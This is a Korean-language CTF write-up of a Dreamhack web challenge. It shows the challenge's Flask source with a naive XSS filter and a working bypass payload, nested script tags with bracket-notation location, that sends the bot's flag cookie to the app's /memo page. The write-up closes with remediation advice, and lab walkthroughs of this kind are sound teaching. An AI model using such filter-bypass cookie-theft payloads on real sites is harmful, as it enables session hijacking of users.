---

title: "[CTF] XSS-Filtering-Bypass"
date: 2025-09-19 21:30:00 +0900
categories: [CTF, Web]
tags: [CTF, XSS]
description: "드림핵 XSS-Filtering-Bypass"
author: "송지민"
toc: true
---------

## 문제 개요

이번 문제는 간단한 XSS 검사/필터가 적용된 웹 애플리케이션이다. 필터는 `script`, `on`, `javascript:` 세 문자열을 제거하지만, 제거는 단순 문자열 치환 방식으로 한 번만 수행된다. 이 점을 이용해 필터를 우회하면 팝업이나 쿠키 탈취 등 XSS를 통한 공격을 할 수 있다.

* 취약 엔드포인트: `/vuln?param=...` (반환값을 그대로 렌더링)
* 필터링 로직: `script`, `on`, `javascript:` 을 소문자 기준 포함 시 제거
* FLAG 흐름: `/flag`에서 내부적으로 체크하는 `check_xss()`가 브라우저(Chrome headless)를 통해 취약점을 탐지하면 FLAG 관련 쿠키가 실행 컨텍스트에 주입되어 동작한다.

---

## 문제에 제공된 원본 소스코드

아래는 문제에서 제공된 `app.py` 전체 소스코드이다.

```python
#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"


def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        service = Service(executable_path="/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True


def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)

def xss_filter(text):
    _filter = ["script", "on", "javascript:"]
    for f in _filter:
        if f in text.lower():
            text = text.replace(f, "")
    return text

@app.route("/")
def index():
    return render_template("index.html")


@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    param = xss_filter(param)
    return param


@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'


memo_text = ""


@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text)


app.run(host="0.0.0.0", port=8000)
```

---

## 내가 실제로 푼 방법

필터 함수 `xss_filter()`를 자세히 보면 다음과 같다.

```python
_filter = ["script", "on", "javascript:"]
for f in _filter:
    if f in text.lower():
        text = text.replace(f, "")
```

* 핵심: 필터는 소문자 기반으로 검사하고, `replace()`로 해당 문자열을 제거한다. 그러나 `replace()`는 원본 `text`에 대해 대소문자 구분하여 수행하므로, 소문자 패턴만 제거하고 대문자나 중간에 끊긴 형태는 그대로 남을 수 있다.
* 우회 아이디어: `script` 단어를 `scrscriptipt`처럼 중첩해서 넣으면 `script`가 제거되어도 남는 부분으로 태그를 구성할 수 있다. 또한 `location`에는 `on`이 포함되어 있어 필터에서 제거되므로 `document.location` 같은 표준 접근이 깨진다. 이를 피하기 위해 `document['locatio'+'n']`처럼 대괄호 표기법으로 우회한다.

### 내 페이로드(풀이에 사용한 코드)

아래 페이로드는 교육/풀이 목적이며, 서버의 필터를 우회해 `document.cookie`를 `/memo`로 전송한다.

```html
<scrscriptipt>document['locatio'+'n'].href = "/memo?memo=" + document.cookie;</scrscriptipt>
```

* 동작 원리:

  1. 브라우저(헤드리스 크롬)가 페이지의 반환값을 HTML로 해석하면 `scrscriptipt`에서 내부 `script` 부분이 일부 제거되어 최종적으로 유효한 `<script>` 태그가 된다.
  2. `document['locatio'+'n']`은 `document.location`과 동일하게 동작하지만 `on` 문자열이 필터에 걸리지 않는다.
  3. 최종적으로 `location.href`를 이용해 `/memo?memo=`으로 `document.cookie`를 전송하면, `memo` 엔드포인트가 이 값을 기록하고 공격자가 확인 가능하게 된다.

---

## 재현 흐름

1. 공격자: `/flag` 페이지에서 POST로 `param`에 위 페이로드 전달
2. 서버: 내부 체크(헤드리스 브라우저)가 `/vuln?param=...`에 접속하고 필터가 적용된 응답을 브라우저가 렌더링
3. 브라우저: 필터 우회 페이로드 실행 → `document.cookie`가 `/memo?memo=`에 전송
4. 공격자: `/memo`에서 기록된 쿠키를 확인하여 FLAG 획득

---

## 왜 이게 가능했나

* 필터 로직이 단순 문자열 제거 방식이며 대소문자와 조합 변형을 고려하지 않았다.
* `replace()`가 원본 대소문자를 보존하므로, 소문자 검사만으로 우회가 가능한 경우가 생긴다.
* 브라우저 자바스크립트의 다양한 문법 표현(예: `document['locatio'+'n']`)을 사용하면 필터가 제거한 문자열을 우회할 수 있다.

---

## 마무리

이 문제는 '단순 문자열 제거' 방식의 필터가 얼마나 취약한지를 잘 보여주는 사례다. XSS 필터링을 구현할 때는 정교한 문맥 기반 필터링(또는 완전한 출력 인코딩)을 사용하거나, 가능한 경우 사용자 입력을 HTML로 직접 삽입하지 않는 설계가 필요하다.

